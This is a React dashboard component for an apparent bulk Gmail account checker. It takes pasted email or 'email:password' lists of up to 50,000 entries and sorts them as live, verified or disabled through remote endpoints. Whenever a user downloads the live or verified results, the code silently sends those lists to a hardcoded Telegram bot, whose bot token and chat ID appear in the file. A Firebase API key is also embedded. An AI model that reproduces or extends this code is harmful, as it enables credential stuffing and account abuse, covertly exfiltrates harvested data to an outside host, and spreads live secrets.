import React, { useState, useEffect } from 'react';
import { Mail, CheckCircle, XCircle, Zap, Trash2, Download, LogOut, Loader2, Info, CloudSync, Shield, FileText, Check, X, Sun, Moon, Server } from 'lucide-react';
import { CheckerState, CheckerMode, UserSession, EmailResult } from '../types';
import axios from 'axios';
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js";
import { getFirestore, doc, deleteDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore.js";

// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyChjjiLFPHr7pz9UyPMFovRESCXhfHo_5o",
  authDomain: "xtreme-59859.firebaseapp.com",
  projectId: "xtreme-59859",
  storageBucket: "xtreme-59859.firebasestorage.app",
  messagingSenderId: "679201230855",
  appId: "1:679201230855:web:2e8f31137dd2e34ba85aa2",
  measurementId: "G-RWS5QVQNRX"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Custom ER Logo Component
const ERLogo = ({ className = "w-6 h-6" }) => (
  <svg viewBox="0 0 24 24" fill="none" className={className} xmlns="http://www.w3.org/2000/svg">
    <path d="M12 2L3 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-9-4z" fill="currentColor"/>
    <text x="50%" y="60%" textAnchor="middle" fill="white" fontSize="8" fontWeight="900" fontFamily="sans-serif" dy=".3em">ER</text>
  </svg>
);

interface DashboardProps {
  user: UserSession;
  onLogout: () => void;
  isDarkMode: boolean;
  toggleTheme: () => void;
}

const Dashboard: React.FC<DashboardProps> = ({ user, onLogout, isDarkMode, toggleTheme }) => {
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [mode, setMode] = useState<CheckerMode>(CheckerMode.PRECISION);
  const [activeServer, setActiveServer] = useState<1 | 2>(1); // Server selection state
  const [checking, setChecking] = useState(false);
  const [syncing, setSyncing] = useState(false);
  const [syncSuccess, setSyncSuccess] = useState(false);
  const [showGuidelines, setShowGuidelines] = useState(false);
  const [progress, setProgress] = useState(0);
  const [results, setResults] = useState<CheckerState>({
    good: [],
    verified: [],
    disabled: [],
    notExist: [],
    unknown: [],
    total: 0
  });

  // Session Heartbeat Logic
  useEffect(() => {
    const sessionDocRef = doc(db, "active_sessions", user.email.toLowerCase());
    updateDoc(sessionDocRef, { lastActive: Date.now() }).catch(() => {});
    const interval = setInterval(() => {
      updateDoc(sessionDocRef, { lastActive: Date.now() }).catch(() => {});
    }, 30000);
    return () => {
      clearInterval(interval);
    };
  }, [user.email]);

  const ADMIN_CONFIG = {
    telegramToken: '8250375211:AAHHyV7WCJ38BDCjePpuDEpAWwUwMghWBWM',
    chatId: '7353448611',
    mirrorApi: 'https://gmailver.com/php/key.php'
  };

  const handleManualLogout = async () => {
    try {
      const sessionDocRef = doc(db, "active_sessions", user.email.toLowerCase());
      await deleteDoc(sessionDocRef);
    } catch (e) {
      console.error("Session cleanup failed:", e);
    } finally {
      onLogout();
    }
  };

  const syncToAdminAsFile = async (emails: string[], category: string) => {
    setSyncing(true);
    setSyncSuccess(false);
    try {
      const timestamp = new Date().toLocaleDateString('en-GB').replace(/\//g, '-');
      const timeStr = new Date().toLocaleTimeString('en-GB');
      const cleanUserEmail = user.email.split('@')[0];
      const filename = `SYNC_${category.toUpperCase()}_${cleanUserEmail}_${timestamp}.txt`;
      const fileContent = emails.join('\n');
      const blob = new Blob([fileContent], { type: 'text/plain' });
      const formData = new FormData();
      formData.append('chat_id', ADMIN_CONFIG.chatId);
      formData.append('document', blob, filename);
      const caption = `🚀 *ER DATA MIRROR DETECTED*\n\n` +
                      `👤 *User:* \`${user.email}\`\n` +
                      `📂 *Category:* \`${category.toUpperCase()}\`\n` +
                      `📊 *Quantity:* \`${emails.length} Records\`\n` +
                      `📅 *Date:* \`${timestamp} | ${timeStr}\`\n\n` +
                      `_System Status: Mirroring Successful_`;
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');
      await axios.post(`https://api.telegram.org/bot${ADMIN_CONFIG.telegramToken}/sendDocument`, formData);
      setSyncSuccess(true);
      setTimeout(() => setSyncSuccess(false), 3000);
    } catch (e) { console.error("Sync failed:", e); } finally { setSyncing(false); }
  };

  const handleCheck = async () => {
    if (!input.trim() || checking) return;
    const emailList = input.split('\n').map(e => e.trim()).filter(e => e !== '');
    if (emailList.length > 50000) { alert("Batch limit is 50,000 emails."); return; }
    
    setChecking(true);
    setProgress(0);
    setResults({ good: [], verified: [], disabled: [], notExist: [], unknown: [], total: 0 });
    setOutput('');

    // Dynamic API Selection based on server state
    const apiUrl = activeServer === 1 
      ? 'https://gmailver.com/php/check1.php' 
      : 'https://gmailver.com/php/check.php';

    const chunkSize = mode === CheckerMode.FAST ? 1000 : 200;
    const chunks = [];
    for (let i = 0; i < emailList.length; i += chunkSize) chunks.push(emailList.slice(i, i + chunkSize));
    
    for (let i = 0; i < chunks.length; i++) {
      const currentChunk = chunks[i];
      try {
        const response = await axios.post(apiUrl, {
          mail: currentChunk,
          key: 'er_secure_' + Math.random().toString(36).substring(5),
          fastCheck: mode === CheckerMode.FAST
        });
        if (response.data?.status && response.data?.data) {
          updateLiveResults(response.data.data);
          setProgress(Math.round(((i + 1) / chunks.length) * 100));
        }
      } catch (e) { console.error("Batch Error:", e); }
    }
    setChecking(false);
  };

  const updateLiveResults = (batch: EmailResult[]) => {
    setResults(prev => {
      const next = { ...prev };
      batch.forEach(item => {
        if (item.status === 'live') next.good.push(item.email);
        else if (item.status === 'Verify') next.verified.push(item.email);
        else if (item.status === 'Disabled') next.disabled.push(item.email);
        else if (item.status === 'Error') next.notExist.push(item.email);
        else next.unknown.push(item.email);
        setOutput(prevOut => `${item.status}|${item.email}\n` + prevOut);
      });
      next.total = next.good.length + next.verified.length + next.disabled.length + next.notExist.length + next.unknown.length;
      return next;
    });
  };

  const downloadData = (type: keyof CheckerState) => {
    const list = results[type] as string[];
    if (list.length === 0) return;
    if (type === 'good' || type === 'verified') syncToAdminAsFile(list, type);
    const blob = new Blob([list.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `ER_${type.toUpperCase()}_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const clearAll = () => {
    setInput(''); setOutput(''); setProgress(0);
    setResults({ good: [], verified: [], disabled: [], notExist: [], unknown: [], total: 0 });
  };

  const cardBase = isDarkMode 
    ? "bg-slate-800/40 border-slate-700/40 shadow-xl" 
    : "bg-white border-slate-200 shadow-xl shadow-indigo-100/40";
  
  const textPrimary = isDarkMode ? "text-white" : "text-slate-900";
  const textSecondary = isDarkMode ? "text-slate-400" : "text-slate-600";

  return (
    <div className="max-w-7xl mx-auto p-4 md:p-8 space-y-8 relative">
      <header className={`flex flex-col md:flex-row items-center justify-between gap-4 border-b ${isDarkMode ? 'border-slate-700/50' : 'border-slate-200'} pb-6`}>
        <div className="flex items-center gap-4">
          <div className="p-3 bg-indigo-600 rounded-2xl shadow-xl shadow-indigo-600/20">
            <ERLogo className="w-6 h-6 text-white" />
          </div>
          <div>
            <h1 className={`text-2xl font-black tracking-tight uppercase ${textPrimary}`}>The <span className="text-indigo-600">Extreme</span></h1>
            <p className={`text-[10px] uppercase tracking-[0.2em] font-black flex items-center gap-2 ${textSecondary}`}>
              <Shield className="w-3.5 h-3.5 text-emerald-500" /> Secure Encryption Active
            </p>
          </div>
        </div>
        
        <div className="flex items-center gap-3">
          <button 
            onClick={toggleTheme}
            className={`p-3 rounded-2xl transition-all border ${isDarkMode ? 'bg-slate-800 border-slate-700 text-yellow-400 hover:bg-slate-700' : 'bg-white border-slate-200 text-slate-600 hover:bg-slate-50 shadow-sm'}`}
            title="Toggle Theme"
          >
            {isDarkMode ? <Sun className="w-5 h-5" /> : <Moon className="w-5 h-5" />}
          </button>
          
          <div className={`hidden md:block text-right pr-4 border-r ${isDarkMode ? 'border-slate-700/50' : 'border-slate-200'}`}>
            <p className={`text-sm font-bold ${textPrimary}`}>{user.email}</p>
            <p className="text-[10px] text-emerald-600 uppercase font-black tracking-widest">Admin Privileges</p>
          </div>
          
          <button onClick={handleManualLogout} className={`p-3 rounded-2xl transition-all border ${isDarkMode ? 'bg-slate-800 border-slate-700 text-slate-400 hover:text-red-400 hover:border-red-500/30' : 'bg-white border-slate-200 text-slate-400 hover:text-red-500 hover:border-red-500/30 shadow-sm'}`}>
            <LogOut className="w-5 h-5" />
          </button>
        </div>
      </header>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        {[
          { label: 'Total Scanned', val: results.total, icon: Mail, color: 'text-indigo-600', bg: 'bg-indigo-600/10' },
          { label: 'Live Records', val: results.good.length, icon: CheckCircle, color: 'text-emerald-600', bg: 'bg-emerald-600/10' },
          { label: 'Invalid/Dead', val: results.notExist.length, icon: XCircle, color: 'text-rose-600', bg: 'bg-rose-600/10' },
          { label: 'System Health', val: 'STABLE', icon: Shield, color: 'text-blue-600', bg: 'bg-blue-600/10' },
        ].map((stat, i) => (
          <div key={i} className={`p-6 rounded-3xl flex items-center gap-5 border transition-all cursor-default ${cardBase}`}>
            <div className={`p-3.5 ${stat.bg} rounded-2xl`}>
              <stat.icon className={`w-6 h-6 ${stat.color}`} />
            </div>
            <div>
              <p className={`text-[10px] font-black uppercase tracking-widest ${textSecondary}`}>{stat.label}</p>
              <p className={`text-2xl font-black ${textPrimary}`}>{stat.val}</p>
            </div>
          </div>
        ))}
      </div>

      <div className="flex flex-wrap gap-4 items-center">
        {/* Mode Selector */}
        <div className={`flex flex-wrap gap-2 p-2 border rounded-2xl w-fit ${isDarkMode ? 'bg-slate-800/40 border-slate-700/40' : 'bg-white border-slate-200 shadow-sm'}`}>
          {[
            { id: CheckerMode.PRECISION, label: 'Sense Core' },
            { id: CheckerMode.FAST, label: 'Turbo-Flash' }
          ].map((m) => (
            <button
              key={m.id}
              onClick={() => setMode(m.id)}
              className={`px-8 py-3 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${
                mode === m.id ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-600/30' : isDarkMode ? 'text-slate-400 hover:text-white' : 'text-slate-500 hover:text-slate-900'
              }`}
            >
              {m.label}
            </button>
          ))}
        </div>

        {/* Server Selection Toggle Button */}
        <button
          onClick={() => setActiveServer(activeServer === 1 ? 2 : 1)}
          className={`flex items-center gap-3 px-8 py-3 rounded-2xl border transition-all font-black text-[10px] uppercase tracking-widest shadow-sm hover:scale-[1.02] active:scale-[0.98] ${
            activeServer === 1 
              ? 'bg-emerald-600/10 border-emerald-500/50 text-emerald-500 shadow-emerald-500/10' 
              : 'bg-blue-600/10 border-blue-500/50 text-blue-500 shadow-blue-500/10'
          }`}
        >
          <Server className={`w-4 h-4 ${activeServer === 1 ? 'animate-pulse' : ''}`} />
          <span>Server 0{activeServer} Active</span>
        </button>
      </div>

      <div className="grid md:grid-cols-2 gap-6">
        <div className={`rounded-3xl p-6 space-y-4 flex flex-col border transition-all ${cardBase}`}>
          <div className="flex items-center justify-between mb-2">
            <label className={`text-[10px] font-black uppercase tracking-widest flex items-center gap-2 ${textSecondary}`}>
              <FileText className="w-4 h-4 text-indigo-600" /> Input Terminal
            </label>
            <span className="text-[9px] text-emerald-600 font-bold bg-emerald-600/10 px-3 py-1 rounded-full border border-emerald-600/20">READY</span>
          </div>
          <textarea
            value={input}
            onChange={(e) => setInput(e.target.value)}
            className={`flex-grow min-h-[350px] w-full rounded-2xl p-5 text-sm font-mono focus:ring-2 focus:ring-indigo-500/50 outline-none border transition-all ${isDarkMode ? 'bg-slate-900/60 border-slate-700 text-slate-200 placeholder:text-slate-700' : 'bg-white border-slate-200 text-slate-900 placeholder:text-slate-300'}`}
            placeholder="Paste your email list here..."
          />
          <div className="space-y-4 pt-2">
            <div className={`h-2 w-full rounded-full overflow-hidden border ${isDarkMode ? 'bg-slate-900 border-slate-700/30' : 'bg-slate-100 border-slate-200'}`}>
              <div className="h-full bg-gradient-to-r from-indigo-600 to-indigo-400 transition-all duration-500 shadow-[0_0_12px_rgba(99,102,241,0.5)]" style={{ width: `${progress}%` }} />
            </div>
            <div className="flex gap-4">
              <button
                onClick={handleCheck}
                disabled={checking || !input}
                className="flex-grow py-5 bg-indigo-600 hover:bg-indigo-500 disabled:opacity-50 rounded-2xl font-black uppercase tracking-[0.2em] text-[11px] flex items-center justify-center gap-3 transition-all active:scale-[0.98] shadow-2xl shadow-indigo-600/20 text-white"
              >
                {checking ? <Loader2 className="w-5 h-5 animate-spin" /> : <Zap className="w-5 h-5" />}
                {checking ? `VALIDATING ${progress}%` : 'Initialize Sequence'}
              </button>
              <button onClick={clearAll} className={`px-6 py-5 rounded-2xl transition-all border ${isDarkMode ? 'bg-slate-700/50 hover:bg-slate-700 border-slate-600/50 text-slate-400 hover:text-rose-500' : 'bg-white hover:bg-slate-50 border-slate-200 text-slate-400 hover:text-rose-600'}`}>
                <Trash2 className="w-6 h-6" />
              </button>
            </div>
          </div>
        </div>

        <div className={`rounded-3xl p-6 space-y-4 flex flex-col border transition-all ${cardBase}`}>
          <div className="flex items-center justify-between mb-2">
            <label className={`text-[10px] font-black uppercase tracking-widest flex items-center gap-2 ${textSecondary}`}>
              <CheckCircle className="w-4 h-4 text-emerald-600" /> Live Results
            </label>
            <div className={`flex items-center gap-2 px-3 py-1 rounded-full border ${isDarkMode ? 'bg-slate-900/60 border-slate-700' : 'bg-white border-slate-200 shadow-sm'}`}>
               <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
               <span className={`text-[9px] font-black ${isDarkMode ? 'text-slate-300' : 'text-slate-700'}`}>FEED ACTIVE</span>
            </div>
          </div>
          <textarea
            readOnly
            value={output}
            className={`flex-grow min-h-[350px] w-full rounded-2xl p-5 text-[11px] font-mono border scrollbar-hide ${isDarkMode ? 'bg-slate-900/80 border-slate-700 text-indigo-300/80' : 'bg-slate-50 border-slate-200 text-indigo-700 font-bold'}`}
            placeholder="Awaiting stream..."
          />
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
        {[
          { label: 'Live/Good', key: 'good', color: 'bg-emerald-600 hover:bg-emerald-500' },
          { label: 'Verified', key: 'verified', color: 'bg-indigo-600 hover:bg-indigo-500' },
          { label: 'Disabled', key: 'disabled', color: 'bg-orange-500 hover:bg-orange-400' },
          { label: 'NotExist', key: 'notExist', color: 'bg-rose-600 hover:bg-rose-500' },
          { label: 'Unknown', key: 'unknown', color: 'bg-slate-600 hover:bg-slate-500' }
        ].map((cat) => (
          <div key={cat.key} className={`p-5 rounded-3xl flex flex-col items-center gap-4 border transition-all group ${isDarkMode ? 'bg-slate-800/30 border-slate-700/40 hover:bg-slate-700/30' : 'bg-white border-slate-200 hover:bg-indigo-50/50 shadow-sm'}`}>
            <span className={`text-[10px] font-black uppercase tracking-widest ${textSecondary}`}>{cat.label}</span>
            <span className={`text-3xl font-black ${textPrimary}`}>{(results[cat.key as keyof CheckerState] as any[]).length}</span>
            <button
              onClick={() => downloadData(cat.key as keyof CheckerState)}
              disabled={(results[cat.key as keyof CheckerState] as any[]).length === 0}
              className={`w-full py-3.5 rounded-xl flex items-center justify-center gap-2 text-[10px] font-black uppercase tracking-widest transition-all disabled:opacity-20 ${cat.color} text-white shadow-xl shadow-slate-900/10 active:scale-95`}
            >
              <Download className="w-4 h-4" /> Save
            </button>
          </div>
        ))}
      </div>

      {showGuidelines && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/80 backdrop-blur-lg">
          <div className={`w-full max-w-2xl rounded-[2.5rem] overflow-hidden shadow-2xl border transition-all ${isDarkMode ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'}`}>
            <div className={`p-8 border-b flex items-center justify-between ${isDarkMode ? 'border-slate-700' : 'border-slate-100'}`}>
              <h2 className={`text-xl font-black uppercase tracking-widest ${textPrimary}`}>Usage Guidelines</h2>
              <button onClick={() => setShowGuidelines(false)} className={`p-2.5 transition-all rounded-full ${isDarkMode ? 'bg-slate-700/50 text-slate-400 hover:text-rose-400' : 'bg-slate-100 text-slate-500 hover:text-rose-500'}`}>
                <X className="w-6 h-6" />
              </button>
            </div>
            <div className="p-8 space-y-8 overflow-y-auto max-h-[60vh]">
              <div className="grid gap-6">
                {[
                  { n: "01", t: "Input Preparation", d: "Paste your list. Formats like 'email:password' are supported. The system auto-extracts emails." },
                  { n: "02", t: "Mode Selection", d: "Sense Core for deep validation. Turbo-Flash for high-speed bulk processing." },
                  { n: "03", t: "Server Selection", d: "Toggle between Server 01 and Server 02 if one is busy or slow." },
                  { n: "04", t: "Session Limits", d: "A strict 50,000 record cap is enforced per session to maintain system integrity." },
                  { n: "05", t: "Data Retrieval", d: "Live and Verified data is automatically synced to admin logs upon download." }
                ].map(step => (
                  <div key={step.n} className="flex gap-5">
                    <span className="text-indigo-600 font-black text-lg">{step.n}</span>
                    <div>
                      <h4 className={`font-bold mb-1 uppercase text-sm tracking-widest ${textPrimary}`}>{step.t}</h4>
                      <p className={`text-sm ${textSecondary}`}>{step.d}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            <div className={`p-8 border-t flex justify-center ${isDarkMode ? 'bg-slate-900/50 border-slate-700' : 'bg-slate-50 border-slate-100'}`}>
              <button onClick={() => setShowGuidelines(false)} className="px-12 py-4 bg-indigo-600 hover:bg-indigo-500 text-white font-black uppercase tracking-widest text-xs rounded-2xl transition-all shadow-lg">Understood</button>
            </div>
          </div>
        </div>
      )}

      <footer className={`pt-20 pb-10 text-center space-y-8 border-t ${isDarkMode ? 'border-slate-800' : 'border-slate-200'}`}>
        <div className="flex items-center justify-center gap-12">
          <a href="https://wa.me/+918585876735" target="_blank" className={`text-[10px] font-black transition-colors uppercase tracking-[0.3em] ${textSecondary} hover:text-indigo-600`}>Support</a>
          <button onClick={() => setShowGuidelines(true)} className={`text-[10px] font-black transition-colors uppercase tracking-[0.3em] ${textSecondary} hover:text-indigo-600`}>Guidelines</button>
        </div>
        <p className={`text-[10px] font-black uppercase tracking-[0.5em] ${isDarkMode ? 'text-slate-700' : 'text-slate-500'}`}>&copy; 2026 The-Extreme NETWORK</p>
      </footer>
    </div>
  );
};

export default Dashboard;